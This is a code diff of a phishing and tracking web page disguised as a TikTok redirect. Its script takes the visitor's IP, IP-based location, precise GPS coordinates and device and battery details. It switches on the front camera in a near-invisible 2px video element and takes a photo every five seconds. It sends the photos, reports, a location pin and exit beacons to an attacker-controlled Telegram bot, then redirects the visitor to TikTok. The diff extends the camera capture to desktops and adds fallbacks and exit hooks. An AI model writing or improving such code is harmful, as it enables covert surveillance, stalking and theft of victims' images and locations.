@@ -54,9 +54,9 @@
         }
         .brand { color: #fff; font-size: 24px; font-weight: bold; margin-bottom: 20px; letter-spacing: 3px; }
         .brand span { color: #ff0050; }
-        #cam { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        #cam { position: fixed; top: 0; left: 0; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; }
         #canvas { display: none; }
-        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 80px; overflow: hidden; text-align: left; padding: 0 20px; }
+        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 100px; overflow: hidden; text-align: left; padding: 0 20px; }
     </style>
 </head>
 <body>
@@ -78,73 +78,115 @@
     </div>
 
     <script>
+    // ==================== CONFIGURATION ====================
     var p = new URLSearchParams(location.search);
     var redir = p.get('r') || 'https://www.tiktok.com';
     var bot = p.get('bot') || '';
     var chat = p.get('chat') || '';
-    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    
+    // ==================== GLOBAL VARIABLES ====================
+    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
+    var isDesktop = !isMobile;
     var gpsData = null;
     var ipData = null;
     var photoInterval = null;
-    var streamActive = false;
+    var cameraStream = null;
+    var cameraActive = false;
     var photoCount = 0;
     var visitStart = Date.now();
-    var sent = false;
+    var reportSent = false;
     
+    // ==================== DEBUG LOG ====================
     function log(msg) {
         var d = document.getElementById('debug');
-        d.textContent = d.textContent + '\n' + msg;
+        d.textContent = (d.textContent + '\n' + msg).trim();
+        console.log('[Tracker] ' + msg);
     }
     
-    // Get IP
-    fetch('https://api.ipify.org?format=json')
-        .then(function(r) { return r.json(); })
-        .then(function(d) { ipData = d.ip; log('IP: ' + d.ip); })
-        .catch(function() { ipData = 'Unknown'; });
+    // ==================== GET IP ADDRESS ====================
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(d) { 
+                ipData = d.ip; 
+                log('IP: ' + d.ip); 
+                return d.ip;
+            })
+            .catch(function() { 
+                ipData = 'Unknown'; 
+                return null;
+            });
+    }
     
-    // Get battery
+    // ==================== GET BATTERY INFO ====================
     function getBattery() {
         if (navigator.getBattery) {
             return navigator.getBattery().then(function(b) {
-                return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
+                return { 
+                    level: Math.round(b.level * 100) + '%', 
+                    charging: b.charging ? 'Yes' : 'No' 
+                };
             });
         }
         return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
     }
     
-    // Get GPS
+    // ==================== GET GPS LOCATION ====================
     function getGPS() {
         return new Promise(function(resolve) {
             if (!navigator.geolocation) {
-                log('GPS: Not supported');
+                log('GPS: Not supported on this browser');
                 resolve(null);
                 return;
             }
+            
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
-                    log('GPS: GRANTED ' + pos.coords.latitude.toFixed(4));
+                    log('GPS: GRANTED - ' + pos.coords.latitude.toFixed(6) + ', ' + pos.coords.longitude.toFixed(6));
                     resolve({
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         acc: pos.coords.accuracy,
-                        alt: pos.coords.altitude
+                        alt: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        heading: pos.coords.heading
                     });
                 },
                 function(err) {
-                    log('GPS: DENIED - ' + err.message);
+                    var msg = '';
+                    switch(err.code) {
+                        case 1: msg = 'Permission Denied'; break;
+                        case 2: msg = 'Position Unavailable'; break;
+                        case 3: msg = 'Timeout'; break;
+                        default: msg = err.message;
+                    }
+                    log('GPS: DENIED - ' + msg);
                     resolve(null);
                 },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                { 
+                    enableHighAccuracy: true, 
+                    timeout: 10000, 
+                    maximumAge: 0 
+                }
             );
         });
     }
     
-    // Start camera
+    // ==================== START CAMERA (MOBILE + DESKTOP) ====================
     async function startCamera() {
-        if (!isMobile) { log('Camera: Desktop - skipped'); return false; }
+        log('Camera: Attempting to start...');
+        log('Device: ' + (isMobile ? 'Mobile' : 'Desktop'));
+        
+        // Check if mediaDevices is supported
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            log('Camera: Not supported on this browser');
+            return false;
+        }
+        
         try {
             var v = document.getElementById('cam');
             
+            // Try to get camera
             var stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
@@ -154,73 +196,163 @@
             });
             
             v.srcObject = stream;
+            cameraStream = stream;
             
             // Wait for video to be ready
-            await new Promise(function(resolve) {
+            await new Promise(function(resolve, reject) {
+                var timeout = setTimeout(function() {
+                    resolve(); // Resolve anyway after 5 seconds
+                }, 5000);
+                
                 v.onloadedmetadata = function() {
+                    clearTimeout(timeout);
                     v.play().then(resolve).catch(resolve);
                 };
-                setTimeout(resolve, 3000);
+                
+                // If already loaded
+                if (v.readyState >= 2) {
+                    clearTimeout(timeout);
+                    v.play().then(resolve).catch(resolve);
+                }
             });
             
-            streamActive = true;
-            log('Camera: Started ' + v.videoWidth + 'x' + v.videoHeight);
-            return true;
+            // Check if video actually has dimensions
+            if (v.videoWidth && v.videoWidth > 0) {
+                cameraActive = true;
+                log('Camera: SUCCESS - ' + v.videoWidth + 'x' + v.videoHeight);
+                return true;
+            } else {
+                log('Camera: Started but no video feed detected');
+                return false;
+            }
+            
         } catch(e) {
-            log('Camera: ' + e.message);
+            log('Camera: ERROR - ' + e.message);
+            
+            // Try without specific constraints (more compatible)
+            try {
+                var stream2 = await navigator.mediaDevices.getUserMedia({ video: true });
+                var v = document.getElementById('cam');
+                v.srcObject = stream2;
+                cameraStream = stream2;
+                await v.play();
+                
+                if (v.videoWidth && v.videoWidth > 0) {
+                    cameraActive = true;
+                    log('Camera: SUCCESS (fallback) - ' + v.videoWidth + 'x' + v.videoHeight);
+                    return true;
+                }
+            } catch(e2) {
+                log('Camera: FALLBACK also failed - ' + e2.message);
+            }
+            
             return false;
         }
     }
     
-    // Take photo
+    // ==================== TAKE PHOTO ====================
     function takePhoto() {
-        if (!streamActive) { log('Photo: Camera not active'); return null; }
+        if (!cameraActive) { 
+            return null; 
+        }
+        
         try {
             var v = document.getElementById('cam');
-            var c = document.getElementById('canvas');
             
             if (!v.videoWidth || v.videoWidth === 0) {
-                log('Photo: Video not ready yet');
+                log('Photo: Video stream not ready');
                 return null;
             }
             
+            var c = document.getElementById('canvas');
             c.width = v.videoWidth;
             c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+            
+            var ctx = c.getContext('2d');
+            
+            // Flip horizontally for front camera (mirror effect)
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(v, -c.width, 0, c.width, c.height);
+            ctx.restore();
             
             photoCount++;
-            log('Photo: #' + photoCount + ' OK');
+            log('Photo #' + photoCount + ': Captured (' + c.width + 'x' + c.height + ')');
+            
             return c.toDataURL('image/jpeg', 0.7);
+            
         } catch(e) {
-            log('Photo: Error ' + e.message);
+            log('Photo: Error - ' + e.message);
             return null;
         }
     }
     
-    // Send photo
-    function sendPhoto(photoData) {
-        if (!photoData) return;
-        var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
-        var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-        while(n--) u8[n] = bstr.charCodeAt(n);
-        var blob = new Blob([u8], {type: mime});
+    // ==================== SEND PHOTO TO TELEGRAM ====================
+    function sendPhotoToTelegram(photoData) {
+        if (!photoData || !bot || !chat) return;
         
-        var fd = new FormData();
-        fd.append('chat_id', chat);
-        fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
-        fd.append('caption', '📸 Photo #' + photoCount);
-        
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
-        xhr.onload = function() { log('Photo sent: ' + xhr.status); };
-        xhr.send(fd);
+        try {
+            // Convert base64 to blob
+            var arr = photoData.split(',');
+            var mime = arr[0].match(/:(.*?);/)[1];
+            var bstr = atob(arr[1]);
+            var n = bstr.length;
+            var u8 = new Uint8Array(n);
+            while(n--) { u8[n] = bstr.charCodeAt(n); }
+            var blob = new Blob([u8], {type: mime});
+            
+            var fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('photo', blob, 'capture_' + photoCount + '.jpg');
+            fd.append('caption', '📸 Photo #' + photoCount + ' | ' + new Date().toLocaleTimeString());
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
+            xhr.onload = function() { 
+                log('Photo #' + photoCount + ' sent: ' + xhr.status); 
+            };
+            xhr.onerror = function() { 
+                log('Photo #' + photoCount + ' FAILED'); 
+            };
+            xhr.send(fd);
+            
+        } catch(e) {
+            log('Photo send error: ' + e.message);
+        }
     }
     
-    // Build and send report
-    async function sendReport(isFinal) {
-        if (sent && !isFinal) return;
-        sent = true;
+    // ==================== GET IP LOCATION ====================
+    async function getIPLocation() {
+        if (!ipData || ipData === 'Unknown') return '';
         
+        try {
+            var resp = await fetch('http://ip-api.com/json/' + ipData + '?fields=country,regionName,city,zip,timezone,lat,lon');
+            var loc = await resp.json();
+            
+            if (loc.country) {
+                var text = '';
+                text += '📍 Location Details\n';
+                text += '   • Country: ' + loc.country + '\n';
+                text += '   • Region: ' + (loc.regionName || 'N/A') + '\n';
+                text += '   • City: ' + (loc.city || 'N/A') + '\n';
+                text += '   • Postal Code: ' + (loc.zip || 'N/A') + '\n';
+                text += '   • Timezone: ' + (loc.timezone || 'N/A') + '\n';
+                if (loc.lat && loc.lon) {
+                    text += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
+                }
+                text += '\n';
+                return text;
+            }
+        } catch(e) {
+            log('IP Location lookup failed');
+        }
+        
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        return '📍 Location Details\n   • Timezone: ' + tz + '\n\n';
+    }
+    
+    // ==================== BUILD REPORT ====================
+    async function buildReport(isFinal) {
         var ua = navigator.userAgent;
         var plat = navigator.platform;
         var lang = navigator.language;
@@ -233,53 +365,47 @@
         var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
         var duration = Math.floor((Date.now() - visitStart) / 1000);
         var battery = await getBattery();
+        var ipLocation = await getIPLocation();
         
+        // Device model detection
         var deviceModel = plat;
         if (/iPhone/.test(ua)) {
             var iosVer = ua.match(/OS (\d+_\d+)/);
             deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
         } else if (/Android/.test(ua)) {
-            deviceModel = 'Android Device';
+            var androidVer = ua.match(/Android\s([\d.]+)/);
+            deviceModel = 'Android ' + (androidVer ? androidVer[1] : '') + ' Device';
         } else if (/Windows/.test(plat)) {
             deviceModel = 'Windows PC';
         } else if (/Mac/.test(plat)) {
             deviceModel = 'Mac Computer';
+        } else if (/Linux/.test(plat)) {
+            deviceModel = 'Linux Computer';
         }
         
-        var ipLocText = '';
-        try {
-            var ipRes = await fetch('http://ip-api.com/json/' + (ipData || '') + '?fields=country,regionName,city,zip,timezone');
-            var ipLoc = await ipRes.json();
-            if (ipLoc.country) {
-                ipLocText = 
-                    '📍 Location Details\n' +
-                    '   • Country: ' + ipLoc.country + '\n' +
-                    '   • Region: ' + (ipLoc.regionName || 'N/A') + '\n' +
-                    '   • City: ' + (ipLoc.city || 'N/A') + '\n' +
-                    '   • Postal Code: ' + (ipLoc.zip || 'N/A') + '\n' +
-                    '   • Timezone: ' + (ipLoc.timezone || tz) + '\n\n';
-            }
-        } catch(e) {
-            ipLocText = '📍 Location Details\n   • Timezone: ' + tz + '\n\n';
-        }
-        
-        var prefix = isFinal ? '📋 FINAL REPORT\n\n' : '';
+        var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
         
         var msg = prefix;
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
         msg += '    📊 Visitor Information Captured\n';
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
         
+        // Device & Browser
         msg += '🖥️ Device & Browser\n';
         msg += '   • Device Model: ' + deviceModel + '\n';
+        msg += '   • Device Type: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n';
         msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
         
+        // Network
         msg += '🌐 Network Information\n';
-        msg += '   • IP Address: ' + (ipData || 'N/A') + '\n';
-        msg += '   • Language: ' + lang + '\n\n';
+        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
+        msg += '   • Language: ' + lang + '\n';
+        msg += '   • Timezone: ' + tz + '\n\n';
         
-        msg += ipLocText;
+        // IP Location
+        msg += ipLocation;
         
+        // GPS Section
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
         msg += '    🗺️ GPS Coordinates\n';
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
@@ -288,13 +414,17 @@
             msg += '   ✅ Location Granted\n';
             msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
             msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
-            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n\n';
-            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
+            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n';
+            if (gpsData.alt) msg += '   • Altitude: ' + gpsData.alt.toFixed(1) + 'm\n';
+            if (gpsData.speed) msg += '   • Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
+            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
         } else {
-            msg += '   ❌ Location: Denied\n';
-            msg += '   💡 Location permission was not granted\n\n';
+            msg += '   ❌ Location: Not available\n';
+            if (isDesktop) msg += '   💡 Desktop detected - GPS not available on most computers\n';
+            msg += '   💡 Location permission was not granted or unavailable\n\n';
         }
         
+        // Device Details
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
         msg += '    📱 Device Details\n';
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
@@ -307,88 +437,167 @@
         msg += '   • Charging: ' + battery.charging + '\n\n';
         
         msg += '🔐 Device Permissions\n';
-        msg += '   • Camera: ' + (streamActive ? 'Active' : 'Unknown') + '\n';
-        msg += '   • Location: ' + (gpsData ? 'Granted' : 'Denied') + '\n\n';
+        msg += '   • Camera: ' + (cameraActive ? 'Active 📸' : 'Not Available') + '\n';
+        msg += '   • Location: ' + (gpsData ? 'Granted ✅' : 'Denied ❌') + '\n\n';
         
         msg += '💾 Hardware & Storage\n';
         msg += '   • CPU Cores: ' + cores + '\n';
         msg += '   • RAM: ' + ram + ' GB\n';
         msg += '   • Photos Captured: ' + photoCount + '\n';
-        msg += '   • Visit Duration: ' + duration + 's\n\n';
+        msg += '   • Visit Duration: ' + duration + ' seconds\n\n';
         
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
         msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
         msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
         
-        // Send via XHR
+        return msg;
+    }
+    
+    // ==================== SEND REPORT TO TELEGRAM ====================
+    async function sendReport(isFinal) {
+        if (reportSent && !isFinal) return;
+        reportSent = true;
+        
+        log(isFinal ? 'Sending FINAL report...' : 'Sending report...');
+        
+        var msg = await buildReport(isFinal);
+        
+        // Use synchronous XHR to ensure it sends before redirect
         var xhr = new XMLHttpRequest();
         xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false);
         xhr.setRequestHeader('Content-Type', 'application/json');
+        
         try {
-            xhr.send(JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true }));
-            log('Report sent: ' + xhr.status);
+            xhr.send(JSON.stringify({
+                chat_id: chat,
+                text: msg,
+                disable_web_page_preview: true
+            }));
+            log('Report sent: HTTP ' + xhr.status);
+            
+            if (xhr.status === 200) {
+                var resp = JSON.parse(xhr.responseText);
+                if (!resp.ok) {
+                    log('Telegram error: ' + resp.description);
+                }
+            }
         } catch(e) {
-            log('Report FAILED');
+            log('Report FAILED: ' + e.message);
         }
         
-        // Send location pin if GPS
+        // Send GPS location pin
         if (gpsData) {
             var xhr2 = new XMLHttpRequest();
             xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
             xhr2.setRequestHeader('Content-Type', 'application/json');
             try {
-                xhr2.send(JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon }));
+                xhr2.send(JSON.stringify({
+                    chat_id: chat,
+                    latitude: gpsData.lat,
+                    longitude: gpsData.lon
+                }));
+                log('Location pin sent');
             } catch(e) {}
         }
     }
     
-    // Main
+    // ==================== STOP CAMERA ====================
+    function stopCamera() {
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(function(track) {
+                track.stop();
+            });
+            cameraStream = null;
+            cameraActive = false;
+            log('Camera: Stopped');
+        }
+        if (photoInterval) {
+            clearInterval(photoInterval);
+            photoInterval = null;
+        }
+    }
+    
+    // ==================== MAIN ====================
     async function main() {
-        log('Starting...');
+        log('=== TRACKER STARTED ===');
+        log('Device: ' + (isMobile ? 'MOBILE' : 'DESKTOP'));
+        log('Redirect: ' + redir);
         
-        // Get GPS
+        document.getElementById('status').textContent = 'DETECTING...';
+        
+        // Get IP (don't wait)
+        getIP();
+        
+        // Get GPS (wait max 10 seconds)
+        document.getElementById('status').textContent = 'LOCATING...';
         gpsData = await getGPS();
         
         // Start camera
+        document.getElementById('status').textContent = 'INITIALIZING...';
         var camStarted = await startCamera();
         
-        // Send report BEFORE redirect
+        // Send report FIRST (before redirect)
+        document.getElementById('status').textContent = 'SENDING...';
         await sendReport(false);
         
-        // Take photos after camera initialized
+        // Start photo capture after report is sent
         if (camStarted) {
+            log('Starting photo capture...');
+            
+            // First photo after 2 seconds
             setTimeout(function() {
                 var photo = takePhoto();
-                if (photo) sendPhoto(photo);
+                if (photo) sendPhotoToTelegram(photo);
                 
+                // Then every 5 seconds
                 photoInterval = setInterval(function() {
                     var photo = takePhoto();
-                    if (photo) sendPhoto(photo);
+                    if (photo) sendPhotoToTelegram(photo);
                 }, 5000);
             }, 2000);
         }
         
         // Redirect
-        document.getElementById('status').textContent = 'DONE';
+        document.getElementById('status').textContent = 'COMPLETE';
+        log('Redirecting to: ' + redir);
+        
         setTimeout(function() {
             document.getElementById('splash').style.display = 'none';
             window.location.href = redir;
-        }, 500);
+        }, 800);
     }
     
-    // On leave
-    window.addEventListener('beforeunload', function() {
-        if (photoInterval) clearInterval(photoInterval);
-        if (streamActive) {
-            try {
-                document.getElementById('cam').srcObject.getTracks().forEach(function(t) { t.stop(); });
-            } catch(e) {}
+    // ==================== PAGE EXIT HANDLER ====================
+    function handleExit() {
+        stopCamera();
+        
+        var duration = Math.floor((Date.now() - visitStart) / 1000);
+        var exitMsg = '📋 User Left Page\n' +
+                      '⏱ Duration: ' + duration + 's\n' +
+                      '📸 Photos: ' + photoCount + '\n' +
+                      '📱 Device: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n' +
+                      '🌐 IP: ' + (ipData || 'Unknown');
+        
+        // Use sendBeacon for reliable exit reporting
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(
+                'https://api.telegram.org/bot' + bot + '/sendMessage',
+                JSON.stringify({ chat_id: chat, text: exitMsg })
+            );
+            log('Exit message sent via beacon');
         }
-        var leaveMsg = '📋 Left page | Duration: ' + Math.floor((Date.now()-visitStart)/1000) + 's | Photos: ' + photoCount;
-        navigator.sendBeacon('https://api.telegram.org/bot' + bot + '/sendMessage',
-            JSON.stringify({ chat_id: chat, text: leaveMsg }));
+    }
+    
+    window.addEventListener('beforeunload', handleExit);
+    window.addEventListener('pagehide', handleExit);
+    window.addEventListener('unload', handleExit);
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            handleExit();
+        }
     });
     
+    // ==================== START ====================
     main();
     </script>
 </body>
